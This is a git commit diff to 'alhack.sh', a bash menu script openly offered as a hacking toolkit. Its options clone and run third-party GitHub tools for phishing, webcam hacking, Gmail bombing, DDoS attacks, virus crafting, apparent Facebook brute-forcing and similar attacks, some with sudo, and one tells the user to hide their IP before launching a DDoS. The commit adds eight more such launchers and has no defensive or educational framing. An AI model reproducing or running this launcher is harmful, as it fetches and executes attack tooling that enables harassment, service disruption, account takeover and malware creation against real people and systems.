d6bd5a1e89c825ae54e861c9e494e99332a3a75c
SICARIO ⁂ <75425513+Sic4rio@users.noreply.github.com>
2025-01-08 18:05:28 -0500

    Update alhack.sh

--- alhack.sh
+++ alhack.sh
@@ -2,6 +2,7 @@
 
 
 
+clear
 mkdir Tools
 clear 
 echo -e '\033[31;40;1m 
@@ -15,25 +16,25 @@ echo -e '\033[31;40;1m
   github: https://github.com/4lbH4cker
 \033[33;4mVersion:\033[0m 4            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m 4lbH4cker
 
-\e[37m[1]\e[36m Requirements & Updates        \e[37m[2]\e[36m Phishing Tool				
+\e[37m[1]\e[36m Requirements & Update        \e[37m[2]\e[36m Phishing Tool				
 \e[37m[3]\e[36m WebCam Hack                   \e[37m[4]\e[36m Subscan			
 \e[37m[5]\e[36m Gmail Bomber		  \e[37m[6]\e[36m DDOS Attack			
-\e[37m[7]\e[36m How to Use?	                  \e[37m[8]\e[36m Uninstall Downloaded Programs		
-\e[37m[9]\e[36m IP Info	                      \e[37m[10]\e[36m dorks-eye
-\e[37m[11]\e[36m HackerPro                     \e[37m[12]\e[36m RED_HAWK
-\e[37m[13]\e[36m VirusCrafter                  \e[37m[14]\e[36m Info-Site
-\e[37m[15]\e[36m BadMod	                      \e[37m[16]\e[36m Facebash
-\e[37m[17]\e[36m DARKARMY                      \e[37m[18]\e[36m AUTO-IP-CHANGER
+\e[37m[7]\e[36m How to use ?	          \e[37m[8]\e[36m Uninstall downloaded programs		
+\e[37m[9]\e[36m Ip Info	                  \e[37m[10]\e[36m dorks-eye
+\e[37m[11]\e[36m HackerPro                    \e[37m[12]\e[36m RED_HAWK
+\e[37m[13]\e[36m VirusCrafter                 \e[37m[14]\e[36m Info-Site
+\e[37m[15]\e[36m BadMod	                  \e[37m[16]\e[36m Facebash
+\e[37m[17]\e[36m DARKARMY                     \e[37m[18]\e[36m AUTO-IP-CHANGER
 
 '
 
-# Option Selection
+# Option selection
 
-read -p "Enter your choice: " islem
+read -p "Transaction number: " islem
 if [[ $islem == 1 || $islem == 01 ]]; then
 clear
 
-echo -e "\033[47;31;5m Installing updates and requirements...\033[0m"
+echo -e "\033[47;31;5m Installing update and requirements...\033[0m"
 sleep 5
 pkg install git -y
 pkg install python python3 -y
@@ -42,7 +43,7 @@ pkg install curl -y
 apt update
 apt upgrade -y
 clear
-echo -e "\033[47;3;35m Update complete...\033[0m"
+echo -e "\033[47;3;35m Full update...\033[0m"
 sleep 3
 bash alhack.sh
 
@@ -70,7 +71,7 @@ echo -e "\033[47;3;35m Installation may take some time\033[0m"
 sleep 3
 git clone https://github.com/zidansec/subscan
 cd subscan
-read -p "Enter a domain (e.g., example.com): " sc
+read -p "Enter a domain, e.g. (example.com): " sc
 ./subscan $sc
        
 elif [[ $islem == 5 || $islem == 05 ]]; then
@@ -83,8 +84,8 @@ cd fast-mail-bomber/
 mv config.example.php config.php
 php index.php update-providers
 rm -rf data/nodes.json data/dead_providers.json
-echo -e "\033[47;3;35m This installation will take a while\033[0m"
-echo -e "\033[47;3;35m Press Ctrl+C to stop\033[0m"
+echo -e "\033[47;3;35m This installation will take a long time\033[0m"
+echo -e "\033[47;3;35m To stop, press Ctrl+C\033[0m"
 sleep 4
 php index.php update-nodes
 php index.php refine-nodes
@@ -102,19 +103,19 @@ git clone https://github.com/palahsu/DDoS-Ripper.git
 cd DDoS-Ripper
 python3 DRipper.py
 echo ""
-echo -e "\033[47;3;35m Hide your IP before using this\033[0m"
+echo -e "\033[47;3;35m Before using it, hide your IP\033[0m"
 
 elif [[ $islem == 7 || $islem == 07 ]]; then
 clear
-echo "YouTube Video: https://www.youtube.com/watch?v=zgdq6ErscqY"
+echo "Youtube Video: https://www.youtube.com/watch?v=zgdq6ErscqY"
 python3 -m webbrowser https://www.youtube.com/watch?v=zgdq6ErscqY
 sleep 10
-echo "Wait 10 seconds"
+echo "Please wait for 10 seconds"
 bash alhack.sh
 
 elif [[ $islem == 8 || $islem == 08 ]]; then
 clear
-echo -e "\033[47;3;35m REMOVING DOWNLOADED PROGRAMS...\033[0m"
+echo -e "\033[47;3;35m UNINSTALLING DOWNLOADED PROGRAMS...\033[0m"
 sleep 3 
 rm -rf Tools
 
@@ -140,4 +141,90 @@ git clone https://github.com/BullsEye0/dorks-eye.git
 cd dorks-eye
 pip install -r requirements.txt
 python3 dorks-eye.py
+
+elif [[ $islem == 11 || $islem == 011 ]]; then
+clear
+echo -e "\033[47;3;35m Installation may take some time\033[0m"
+sleep 3
+cd Tools
+apt update && apt upgrade && apt install git && apt install python2
+git clone https://github.com/jaykali/hackerpro.git
+cd hackerpro
+sudo bash install.sh
+python2 hackerpro.py
+
+elif [[ $islem == 12 || $islem == 012 ]]; then
+clear
+echo -e "\033[47;3;35m Installation may take some time\033[0m"
+sleep 3
+cd Tools
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+cd RED_HAWK
+php rhawk.php
+
+elif [[ $islem == 13 || $islem == 013 ]]; then
+clear
+echo -e "\033[47;3;35m Installation may take some time\033[0m"
+sleep 3
+cd Tools
+git clone https://github.com/Devil-Tigers/TigerVirus
+apt update
+apt upgrade -y
+pkg install git -y
+cd TigerVirus
+bash app.sh
+
+elif [[ $islem == 14 || $islem == 014 ]]; then
+clear
+echo -e "\033[47;3;35m Installation may take some time\033[0m"
+sleep 3
+cd Tools
+pkg install curl -y
+upgrade -y
+pkg install git -y
+git clone https://github.com/king-hacking/info-site.git
+cd info-site
+bash info.sh
+
+elif [[ $islem == 15 || $islem == 015 ]]; then
+clear
+echo -e "\033[47;3;35m Installation may take some time\033[0m"
+sleep 3
+cd Tools
+sudo apt-get update
+sudo apt-get install php
+sudo apt-get install php-curl
+git clone https://github.com/MrSqar-Ye/BadMod.git
+cd BadMod
+chmod u+x INSTALL
+chmod u+x BadMod.php
+sudo php BadMod.php
+
+elif [[ $islem == 16 || $islem == 016 ]]; then
+clear
+echo -e "\033[47;3;35m Installation may take some time\033[0m"
+sleep 3
+cd Tools
+git clone https://github.com/Hackman404/Facebash.git
+cd Facebash
+bash start.sh
+
+elif [[ $islem == 17 || $islem == 017 ]]; then
+clear
+echo -e "\033[47;3;35m Installation may take some time\033[0m"
+sleep 3
+cd Tools
+git clone https://github.com/d3vil-xD/darkarmy.git
+cd darkarmy
+python3 darkarmy.py
+
+elif [[ $islem == 18 || $islem == 018 ]]; then
+clear
+echo -e "\033[47;3;35m Installing...\033[0m"
+sleep 3
+cd Tools
+git clone https://github.com/htr-tech/Auto-IP-Changer.git
+cd Auto-IP-Changer
+bash auto-ip.sh
+
 fi
